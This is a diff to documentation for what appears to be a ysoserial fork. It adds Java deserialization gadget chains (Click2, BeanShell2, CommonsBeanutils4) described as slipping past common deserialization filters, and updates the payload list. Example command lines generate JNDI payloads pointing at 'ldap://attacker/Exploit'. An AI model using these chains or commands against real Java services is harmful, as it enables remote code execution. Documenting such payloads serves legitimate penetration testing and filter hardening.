@@ -18,6 +18,7 @@ Standard deserialization filters (JEP 290, custom `ObjectInputFilter`) typically
 | `ConcurrentHashMap` | CC10, CC11, ROME4, Hibernate3, ROMEJndi | Rarely blocked — used extensively in JDK internals |
 | `TreeBag` | CB3 | CC4-specific class, not in standard filter lists |
 | `LinkedHashSet` | CC12 | Extends HashSet but class-level filters often miss it |
+| `TreeSet` | Click2, BeanShell2 | Standard JDK class, never blocked in known filters |
 | `BadAttributeValueExpException` | ROME2 | JMX class, not commonly filtered |
 | `Hashtable` | ROME3 | Some filters miss this older Map implementation |
 
@@ -31,6 +32,7 @@ These chains work without `--add-opens java.xml` by using JNDI sinks instead of 
 | `ROMEJndi` | `JdbcRowSetImpl` → JNDI | `java -jar ysoserial.jar ROMEJndi 'ldap://attacker/Exploit'` |
 | `CommonsBeanutilsJndi` | `JdbcRowSetImpl` → JNDI | `java -jar ysoserial.jar CommonsBeanutilsJndi 'ldap://attacker/Exploit'` |
 | `CommonsBeanutilsJndi2` | `JdbcRowSetImpl` → JNDI | CB + CC4 variant |
+| `CommonsBeanutils4` | `JdbcRowSetImpl` → JNDI | CB + PriorityQueue + JNDI sink |
 | `CommonsBeanutilsH2` | `JdbcRowSetImpl` → H2 JDBC INIT | RCE via H2 SQL (requires H2 1.x on target) |
 | `WildFly1` | `InitialContext.lookup()` | Direct JNDI from `readObject()` — 120 bytes |
 
@@ -45,23 +47,29 @@ These chains work without `--add-opens java.xml` by using JNDI sinks instead of 
 | `VaadinMP` | Vaadin `MethodProperty` → arbitrary getter invocation |
 | `SignedObjectWrap` | `SignedObject` wrapper — bypasses first-layer type filters |
 | `CommonsBeanutils3` | CB + TreeBag entry — bypasses PriorityQueue AND InvokerTransformer filters |
+| `CommonsBeanutils4` | CB + JdbcRowSetImpl JNDI sink — no TemplatesImpl, JDK 17+ compatible |
+| `Click2` | Apache Click via TreeSet entry — bypasses PriorityQueue filters |
+| `BeanShell2` | BeanShell interpreter via TreeSet entry — bypasses PriorityQueue filters |
 
-## All Payloads (62 total)
+## All Payloads (65 total)
 
 ```
 Payload                Authors                                Dependencies
 -------                -------                                ------------
 AspectJWeaver          @Jang                                  aspectjweaver:1.9.2, commons-collections:3.2.2
+BeanShell2             @BofeiC                                bsh:2.0b5
 Atomikos               @pwntester, @sciccone                  transactions-osgi:4.0.6, jta:1.1
 BeanShell1             @pwntester, @cschneider4711            bsh:2.0b5
 C3P0                   @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11
 Ceylon                 @kai_ullrich                           ceylon.language:1.3.3
 Click1                 @artsploit                             click-nodeps:2.3.0, javax.servlet-api:3.1.0
+Click2                 @BofeiC                                click-nodeps:2.3.0, javax.servlet-api:3.1.0
 Clojure                @JackOfMostTrades                      clojure:1.8.0
 Clojure2               @JackOfMostTrades                      clojure:1.8.0
 CommonsBeanutils1      @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1
 CommonsBeanutils2      @k4n5ha0                               commons-beanutils:1.9.2
 CommonsBeanutils3      @BofeiC                                commons-beanutils:1.9.2, commons-collections4:4.0
+CommonsBeanutils4      @BofeiC                                commons-beanutils:1.9.2, commons-collections:3.1
 CommonsBeanutilsH2     @BofeiC                                commons-beanutils:1.9.2
 CommonsBeanutilsJndi   @frohoff                               commons-beanutils:1.9.2
 CommonsBeanutilsJndi2  @BofeiC                                commons-beanutils:1.9.2, commons-collections4:4.0
